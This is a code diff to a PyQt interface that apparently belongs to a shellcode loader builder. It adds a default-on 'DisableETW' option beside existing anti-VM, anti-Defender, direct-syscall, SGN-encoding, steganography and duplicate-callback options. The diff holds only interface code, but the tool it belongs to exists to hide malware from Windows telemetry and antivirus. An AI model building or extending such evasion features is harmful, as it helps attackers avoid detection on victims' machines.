@@ -261,6 +261,13 @@ class MainWindow(QMainWindow):
         steg_layout.addWidget(self.steg_check)
         steg_layout.addWidget(self.steg_name) 
         sign_layout.addLayout(steg_layout)
+
+        etw_layout = QHBoxLayout()
+        self.disable_etw_check = QCheckBox("DisableETW")
+        self.disable_etw_check.setChecked(True)
+        etw_layout.addWidget(self.disable_etw_check)
+        sign_layout.addLayout(etw_layout)
+
         payload_control_layout = QHBoxLayout()
         self.payloadControl_check = QCheckBox("启用多重载荷控制(防止重复上线)")
         self.payloadControl_check.setChecked(True)  
@@ -415,7 +422,7 @@ class MainWindow(QMainWindow):
         for combo in [self.encryption_combo, self.exec_combo, self.enum_combo, self.alloc_combo]:
             combo.setStyleSheet(combo_style)
         for check in [self.syscall_check, self.anti_vm_check, self.anti_defender_check, 
-                     self.dll_trick_check, self.sx_trick_check, self.vxqq_check, self.sgn_check , self.steg_check, self.payloadControl_check]:
+                     self.dll_trick_check, self.sx_trick_check, self.vxqq_check, self.sgn_check , self.steg_check, self.disable_etw_check, self.payloadControl_check]:
             check.setStyleSheet("QCheckBox { padding: 2px; }")
     def browse_steg_file(self):
         file_name, _ = QFileDialog.getOpenFileName(
